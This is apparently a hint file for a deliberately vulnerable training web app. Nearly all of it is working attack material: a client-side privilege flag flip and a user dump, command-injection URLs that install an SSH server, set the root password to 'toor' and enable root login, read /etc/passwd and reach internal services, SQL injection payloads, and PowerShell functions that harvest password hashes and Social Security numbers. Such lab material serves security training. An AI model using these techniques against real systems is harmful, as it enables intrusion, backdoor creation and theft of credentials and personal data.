//Looking at this file is most certainly cheating, but if you are not skilled enough to find it on your own then go ahead...

function AdminDump(){
	 exploitableApp.IsAdmin = true;
	 exploitableApp.GetUsersPaged(0, 1000).done(function(data) {
		for (var d in data) {
			exploitableApp.IsUserAdmin(data[d].item1).done(function(result) {
				if (result.isAdmin) exploitableApp.GetUser(result.userID).done(function(x) {
					console.log(x)
				});
			});
		}
	});
}

//What is this interesting result?
//~/home/getimage?v=VXNlcnMuYmFr

//What could be done with this? Combined w/ some type of file upload hack...
//~/admin/runcommand/?cmd=/usr/bin/dotnet&args=--info

//If you combine this with the ability to connect through SSH...
//~/admin/runcommand/?cmd=apt-get&args=update
//~/admin/runcommand/?cmd=apt-get&args=install -y openssh-server
//~/admin/runcommand/?cmd=mkdir&args=/run/sshd
//~/admin/runcommand/?cmd=echo&args=root:toor | chpasswd
//~/admin/runcommand/?cmd=sed&args=-i s/#PermitRootLogin.*/PermitRootLogin\ yes/ /etc/ssh/sshd_config
//~/admin/runcommand/?cmd=/usr/sbin/sshd&args=


//So this could be bad
//~/admin/runcommand/?cmd=cat&args=/etc/passwd

//So perl exists on this server...
//~/admin/runcommand/?cmd=perl&args=-v

//Get internal IP Address
//~/admin/runcommand/?cmd=hostname&args=-i

//We can install packages
//~/admin/runcommand/?cmd=apt-get&args=-y%20install%20binutils

//Look at how you can use this to request systems normally unreachable from the outside
//~/admin/runcommand/?cmd=curl&args=http://exploitableapp-ws:8080/api/processtransaction/1

//SQLi Help
//~/home/AccountExists/?email=\%27%20or%201=1%20--%20a
//~/home/AccountExists/?email=%

//From the console while logged in as admin
function walkPaths(root){
	$.ajax("http://localhost/admin/runcommand/?cmd=ls&args=-l " + root).done(function(x){ 
		var any = false;;
		$(x.results.split('\n')).each(function(i,y){ 
			if(y.startsWith('d')) {
				walkPaths(root + y.split(' ')[y.split(' ').length-1] + "/"); 
				any=true;
			}
		});
		if(!any) console.log(root);
	});
}


///////////////////////////////////////////////////////////////////////////////////////////////
Start Powershell Magic
///////////////////////////////////////////////////////////////////////////////////////////////

function GetPasswordHashes(){
    $j1 = Invoke-WebRequest "http://localhost/admin/GetUsersPaged/0?pagesize=1000" | ConvertFrom-Json 
    foreach($x in $j1){
        $url = "http://localhost/admin/GetUser/$($x.item1)"
        $j2 = Invoke-WebRequest -Uri $url | ConvertFrom-Json 
        foreach($y in $j2){
            $hash = $y.passwordHash
            $hash
        }

    }
}

function GetAdminPasswordHashes(){
    $j1 = Invoke-WebRequest "http://localhost/admin/GetUsersPaged/0?pagesize=1000" | ConvertFrom-Json 
    foreach($x in $j1){
        $url = "http://localhost/home/isadmin/$($x.item1)"
        $isAdmin = Invoke-WebRequest -Uri $url | ConvertFrom-Json
        if($isAdmin.isAdmin -eq "True"){
            $url = "http://localhost/admin/GetUser/$($x.item1)"
            $j2 = Invoke-WebRequest -Uri $url | ConvertFrom-Json 
            foreach($y in $j2){
                $hash = $x.item2 + "," + $y.passwordHash
                $hash
            }
        }
    }
}

function GetSocialSecurityNumbers(){
    $j1 = Invoke-WebRequest "http://localhost/admin/GetUsersPaged/0?pagesize=1000" | ConvertFrom-Json 
    foreach($x in $j1){
        $url = "http://localhost/admin/GetUser/$($x.item1)"
        $j2 = Invoke-WebRequest -Uri $url | ConvertFrom-Json 
        foreach($y in $j2){
            $ssn = $y.ssn
            $ssn
        }

    }
}

///////////////////////////////////////////////////////////////////////////////////////////////
End Powershell Magic
///////////////////////////////////////////////////////////////////////////////////////////////